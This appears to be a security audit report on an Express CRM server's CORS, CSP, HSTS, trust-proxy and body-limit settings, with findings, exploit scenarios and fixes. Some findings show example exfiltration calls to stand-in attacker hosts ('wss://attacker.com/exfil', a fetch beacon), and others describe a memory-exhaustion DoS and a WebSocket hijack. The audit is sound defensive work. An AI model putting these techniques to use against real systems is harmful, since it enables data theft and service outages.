# S29 — CORS, Helmet, Security Headers, Trust Proxy, Body Limits

Scope: `packages/server/src/index.ts` (middleware ordering, helmet/cors/bodyParser), `packages/server/src/config.ts`
Reviewed: 2026-05-05

---

### [MEDIUM] 10 MB body parsed before `authMiddleware` for `/catalog/bulk-import` — DoS amplifier

**Where:** `packages/server/src/index.ts:1222–1225` (body parser mount) vs `packages/server/src/index.ts:1661` (auth mount)

**What:**
`express.json({ limit: '10mb' })` is registered as a bare `app.post()` route-level middleware at line 1222, before the `authMiddleware` that protects the entire `/api/v1/catalog` tree at line 1661. This means every unauthenticated request to `POST /api/v1/catalog/bulk-import` causes the server to buffer up to 10 MB of JSON into memory before the auth check fires (inside `catalogRoutes` → `adminOnly()`). The global API rate limiter (300 req/min per IP, line 1181) mitigates but does not eliminate the risk: 300 req/min × 10 MB = 3 GB/min of server memory consumed by unauthenticated requests from a single IP.

**Code:**
```typescript
// index.ts:1222-1225 — body parser, no auth
app.post(
  '/api/v1/catalog/bulk-import',
  express.json({ limit: '10mb' }),
);

// index.ts:1661 — auth happens LATER, inside catalogRoutes
app.use('/api/v1/catalog', authMiddleware, catalogRoutes);
// catalog.routes.ts:419 — adminOnly() is inside the router
router.post('/bulk-import', adminOnly, asyncHandler(async (req, res) => {
```

**Exploit:**
An unauthenticated attacker sends 300 POST requests/minute each carrying a 10 MB JSON body to `/api/v1/catalog/bulk-import`. The server buffers all bodies before rejecting with 401. At 300 req/min this is 3 GB/min held in the Node.js heap, which can OOM the process and bring down all tenants.

**Fix:**
Move `authMiddleware` (and ideally an admin-role pre-check) before the 10 MB body parser carve-out, or register the large-body parser as the first handler inside `catalogRoutes` rather than as a global `app.post()`. Alternatively, add a lightweight `Content-Length` pre-check middleware that rejects requests with `Content-Length > 1MB` before any body is buffered unless the JWT is valid.

---

### [MEDIUM] `trust proxy` defaults to loopback-only — rate limiter binds to LB IP, not client IP, in cloud deployments

**Where:** `packages/server/src/index.ts:631–634`, `packages/server/src/config.ts:342–348`

**What:**
When `TRUSTED_PROXY_IPS` is not set, `TRUST_PROXY_ALLOWLIST` falls back to `['loopback']` (line 633). In any deployment behind a cloud load balancer (AWS ALB, GCP GLB, Nginx, Cloudflare) that is not loopback, Express does not trust the LB's `X-Forwarded-For`, so `req.ip` resolves to the LB's socket IP — the same value for every client. The API rate limiter (`consumeWindowRate(limitDb, 'api_v1', ip, …)` at line 1196), the webhook rate limiter (line 1539), and all auth rate limiters (auth.routes.ts) key on `req.ip`, so in this configuration the effective per-IP budget is shared across all clients. A single attacker can consume the entire allowance (300 req/min) for all users behind the LB, or conversely one bad client is effectively unthrottled because the counter reflects the whole tenant fleet. There is no startup warning emitted when `TRUSTED_PROXY_IPS` is unset, making this misconfiguration silent.

**Code:**
```typescript
// index.ts:631-634
const TRUST_PROXY_ALLOWLIST = config.trustedProxyIps.length
  ? [...config.trustedProxyIps, '127.0.0.1', '::1']
  : ['loopback'];
app.set('trust proxy', TRUST_PROXY_ALLOWLIST);

// index.ts:1192-1196 — rate limiter uses req.ip
const ip = req.ip || req.socket?.remoteAddress || 'unknown';
const limitDb: Database.Database = (req.db as Database.Database | undefined) ?? db;
const result = consumeWindowRate(limitDb, 'api_v1', ip, API_RATE_LIMIT, API_RATE_WINDOW);
```

**Exploit:**
An operator deploys behind AWS ALB without setting `TRUSTED_PROXY_IPS`. All 300 API requests/minute are attributed to the ALB's private IP. A single attacker sending 300 req/min exhausts the rate-limit budget for all legitimate users on the instance, achieving an unauthenticated rate-limit bypass DoS. Alternatively, an attacker who knows this is the case can make unlimited requests (the counter never hits their personal IP).

**Fix:**
Emit a startup `console.warn` when `TRUSTED_PROXY_IPS` is unset and `NODE_ENV=production`, advising operators to configure the env var. Document in `.env.example` that `TRUSTED_PROXY_IPS` must list the private IP(s) of the load balancer so `req.ip` resolves to the true client IP. Consider detecting the common case (process receives non-loopback `X-Forwarded-For` but trust proxy is loopback-only) and warning at request time.

---

### [LOW] WebSocket origin check allows `localhost`/`127.0.0.1` in production — inconsistent with HTTP CORS

**Where:** `packages/server/src/index.ts:819–825` (WS) vs `packages/server/src/index.ts:1069–1073` (HTTP CORS)

**What:**
`isCorsOriginAllowed()` (HTTP CORS) wraps the loopback/LAN acceptance in `if (config.nodeEnv !== 'production')` (line 1069), correctly rejecting `Origin: http://localhost` in production. However `isWsOriginAllowed()` (WebSocket upgrade verification) has an unconditional `hostname === 'localhost' || hostname === '127.0.0.1'` block (lines 821–822) with no production guard. In production, a page served from localhost (Electron app, local dev server, `file://` via a local HTTP server) can open an authenticated WebSocket to the production server even though the same origin would be CORS-rejected on HTTP. WS sessions still require a valid JWT (sent via `{type:'auth', token:'...'}` within 5 seconds per line 341), so the blast radius is limited to clients who have a valid token — but the origin mismatch is a policy inconsistency that could be leveraged in a Cross-Site WebSocket Hijacking scenario where a localhost-served page is open alongside a logged-in production tab.

**Code:**
```typescript
// index.ts:819-825 — no production guard; always allows localhost
if (
  /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|100\.)/.test(hostname) ||
  hostname === 'localhost' ||
  hostname === '127.0.0.1' ||
  hostname.endsWith('.localhost')
) {
  return true;
}

// index.ts:1069-1073 — HTTP CORS correctly restricts to non-production
if (config.nodeEnv !== 'production') {
  if (/^(10\.|...)/.test(hostname) || hostname === 'localhost' || ...) {
    return true;
  }
}
```

**Exploit:**
In production, an attacker social-engineers the victim (who has an active CRM JWT) into opening a locally-served page. That page calls `new WebSocket('wss://crm.example.com')` and sends the victim's JWT (obtained via `localStorage` if the SPA stores it there) as the `auth` message. The WS upgrade succeeds because `isWsOriginAllowed('http://localhost:3000')` returns `true` unconditionally.

**Fix:**
Add a production guard to `isWsOriginAllowed` for the loopback block, mirroring `isCorsOriginAllowed`. The Electron management app (the intended consumer of WS from localhost) authenticates via `localhostOnly` + super-admin JWT on the HTTP API layer; if it also needs WS, add its origin explicitly to `ALLOWED_ORIGINS`.

---

### [LOW] CSP `connectSrc` contains bare `ws:` and `wss:` — allows JavaScript to open WebSockets to any host

**Where:** `packages/server/src/index.ts:954`

**What:**
The global Content-Security-Policy emitted by Helmet includes `connectSrc: ["'self'", 'ws:', 'wss:', 'https:', ...]`. Bare `ws:` and `wss:` (without a hostname) are host-wildcard values in CSP: they allow any script on the page to `new WebSocket('wss://attacker.com/exfil')` without violating the policy. Combined with `'https:'` in the same directive (allows `fetch('https://attacker.com/beacon')`), the CSP provides no meaningful `connect-src` restriction against data exfiltration in an XSS scenario. The intent (per the comment on line 936) is PWA connectivity to supplier CDNs, but `ws:` / `wss:` in particular do not have a legitimate broad-hostname use case in this application — the app's own WebSocket is same-origin.

**Code:**
```typescript
// index.ts:954
connectSrc: ["'self'", 'ws:', 'wss:', 'https:', 'https://cloudflareinsights.com'],
```

**Exploit:**
If an XSS payload executes in the CRM SPA context, it can exfiltrate data over WebSocket to any attacker-controlled server (`wss://c2.attacker.com`) or via HTTPS fetch to any endpoint. The bare `ws:`/`wss:` values are particularly dangerous because WebSocket connections are not subject to CORS and leak the session cookie.

**Fix:**
Restrict `connectSrc` to `'self'` plus explicitly named hostnames for the WebSocket endpoint (`wss://crm.example.com`, or dynamically include `wss://${baseDomain}` and `wss://*.${baseDomain}`). For Cloudflare analytics, the existing explicit `https://cloudflareinsights.com` entry is correct; remove bare `https:` and `ws:`/`wss:` wildcards and enumerate the narrow set of external hosts actually needed.

---

### [LOW] HSTS `maxAge` is 180 days — below Mozilla/NIST recommended 1-year minimum for durable protection

**Where:** `packages/server/src/index.ts:922–924`

**What:**
Strict-Transport-Security is set with `maxAge: 15552000` (180 days, ~6 months). The Mozilla Observatory and NIST SP 800-52 Rev 2 both recommend at least one year (`maxAge: 31536000`) for HSTS to be effective against SSL-stripping attacks during periods when the user has not visited the site recently. Browsers purge HSTS entries after their max-age expires; a 6-month window means users who don't return for >6 months lose the protection. The `preload` flag is intentionally absent (noted in comments), which is acceptable, but the short max-age weakens the defence even for regular users.

**Code:**
```typescript
// index.ts:922-924
const hstsConfig = config.nodeEnv === 'production'
  ? { maxAge: 15552000, includeSubDomains: true } // 180 days
  : false as const;
```

**Exploit:**
A user who has not visited the CRM in more than 6 months has their HSTS policy expired. An on-path attacker (rogue Wi-Fi, BGP hijack) can perform an SSL-strip attack on the user's next connection, downgrading HTTPS to HTTP and intercepting credentials or session tokens.

**Fix:**
Increase `maxAge` to `31536000` (1 year): `{ maxAge: 31536000, includeSubDomains: true }`. Once operator deployments are stable on a real TLS cert, consider adding `preload: true` and registering on hstspreload.org for the maximum protection level.

---

### [LOW] Super-admin SPA Content-Security-Policy allows `'unsafe-inline'` in `script-src`

**Where:** `packages/server/src/index.ts:1495`

**What:**
The `spaCsp` string applied to all `/super-admin/*` responses (line 1502) includes `script-src 'self' 'unsafe-inline'`. This is acknowledged in the comment (line 1492: "the cost of running a Vite bundle") but means the super-admin panel has no XSS protection for inline scripts. Any reflected or stored XSS vector in the super-admin UI (e.g., via a tenant name, announcement body, or error message rendered without escaping) can execute arbitrary JavaScript with full super-admin API access. The `/super-admin` tree is localhost-only (`localhostOnly` middleware), which substantially limits the attack surface, but the Electron renderer or a local browser accessing the super-admin SPA is fully exposed.

**Code:**
```typescript
// index.ts:1495
const spaCsp = "default-src 'self'; script-src 'self' 'unsafe-inline'; script-src-attr 'none'; ...";
```

**Exploit:**
If an attacker can inject content into a tenant record (e.g., a tenant slug or display name) that appears unescaped in the super-admin React SPA, they can execute script in the `'unsafe-inline'`-permitted context. Because this is the super-admin panel, the XSS would have access to all super-admin API endpoints including tenant provisioning, billing, and the master DB.

**Fix:**
Replace `'unsafe-inline'` with a per-request nonce or a hash of the Vite entrypoint script. Modern Vite (v4+) supports nonce injection via `vite-plugin-csp` or the official `@vitejs/plugin-nonce`. Alternatively, build the management SPA with `legacy: false` mode which uses ES modules and eliminates the inline bootstrap script that requires `'unsafe-inline'`.

---

### [INFO] CSP `connectSrc` and `imgSrc` contain bare `https:` — allows fetch/image from any HTTPS origin

**Where:** `packages/server/src/index.ts:953–954`

**What:**
Both `imgSrc` and `connectSrc` include the bare scheme `https:`, which is equivalent to a host wildcard for all HTTPS origins. This is documented as intentional ("PWA fetches supplier CDN thumbnails"). While the risk of image-src being broad is limited (image loads don't carry credentials for CORS requests), `connectSrc: 'https:'` allows `fetch` / `XMLHttpRequest` to any HTTPS endpoint, weakening the CSP as a data-exfiltration barrier. In an XSS scenario the policy provides no `connect-src` protection beyond the WebSocket restriction.

**Code:**
```typescript
// index.ts:953-954
imgSrc: ["'self'", 'data:', 'blob:', 'https:'],
connectSrc: ["'self'", 'ws:', 'wss:', 'https:', 'https://cloudflareinsights.com'],
```

**Fix:**
Enumerate the actual external domains needed (Cloudflare Insights, the specific supplier CDN domains) instead of `https:`. Even a partial allowlist (e.g., `https://*.shopify.com https://*.aliexpress.com`) dramatically reduces the exfiltration surface in an XSS scenario. The `imgSrc: 'https:'` is lower-risk but still worth narrowing.

---

### [INFO] No startup warning when `TRUSTED_PROXY_IPS` is unset in production

**Where:** `packages/server/src/config.ts:342–348`, `packages/server/src/index.ts:631–634`

**What:**
When `TRUSTED_PROXY_IPS` is not set, `config.trustedProxyIps` is an empty array and `trust proxy` falls back to `['loopback']` silently. There is no `console.warn` at boot time informing operators that rate limiting will be ineffective in load-balanced deployments. Operators who follow the quick-start guide without reading the full env-var reference will unknowingly deploy with a broken rate limiter.

**Code:**
```typescript
// config.ts:342-348
trustedProxyIps: (() => {
  const raw = process.env.TRUSTED_PROXY_IPS || '';
  return raw.split(',').map(s => s.trim()).filter(Boolean);
})(),
// No warning emitted when this returns []
```

**Fix:**
In `index.ts`, after setting `trust proxy`, emit `console.warn` when `config.trustedProxyIps.length === 0 && config.nodeEnv === 'production'` advising the operator to configure `TRUSTED_PROXY_IPS`. Add an example entry to `.env.example`.

---

## Items verified clean

- **`cors({ origin: true })` / wildcard reflect**: Not present. CORS `origin` callback explicitly validates against `isCorsOriginAllowed()` and only returns `true` for vetted origins. `credentials: true` never rides on a wildcard or unvetted reflection.
- **`cors({ origin: '*' })` with credentials**: Not present. The `*` wildcard is never used.
- **ALLOWED_ORIGINS whitespace / prefix injection**: `process.env.ALLOWED_ORIGINS?.split(',').map(o => o.trim()).filter(Boolean)` at lines 782 and 1006 properly trims whitespace on both sides before adding to the allowlist. No prefix-bypass possible.
- **Helmet absent**: Helmet v8 is fully configured at line 943 with explicit `noSniff`, `referrerPolicy`, `frameguard`, `hsts`, and CSP.
- **`X-Content-Type-Options: nosniff`**: Explicitly enabled via `noSniff: true` (line 965); helmet emits the header on every response.
- **`X-Frame-Options`**: Set to `DENY` via `frameguard: { action: 'deny' }` (line 972) and `frame-ancestors: 'none'` in CSP (line 957). Widget routes override to exact-origin per the allowlist (lines 1828–1829).
- **Referrer-Policy**: `strict-origin-when-cross-origin` set via `referrerPolicy` (line 968).
- **`X-Powered-By` header**: Explicitly disabled at line 914 (`app.disable('x-powered-by')`), before helmet which also removes it.
- **Body limit — global 1 MB**: Global `express.json({ limit: '1mb' })` at line 1228 and `express.urlencoded({ limit: '1mb' })` at line 1233.
- **`urlencoded({ extended: true })` without limits**: `qs` library defaults apply (`parameterLimit: 1000`, `arrayLimit: 20`, `depth: 5`); these are not dangerously permissive.
- **HSTS absent in non-production**: Confirmed — `hstsConfig = false` when not production (line 924); HSTS is never burned into dev browsers.
- **`app.disable('x-powered-by')` missing**: Confirmed present at line 914.
- **CORS allowed-origins normalized**: `normalizeOrigin()` strips default ports before comparison, so `https://localhost:443` correctly matches `https://localhost` from a browser (lines 989–999).
- **Cross-Origin-Opener-Policy**: Helmet v8 enables `COOP: same-origin` by default; it is not disabled in the helmet config (only `crossOriginEmbedderPolicy: false` is explicitly disabled at line 962), so COOP is active.
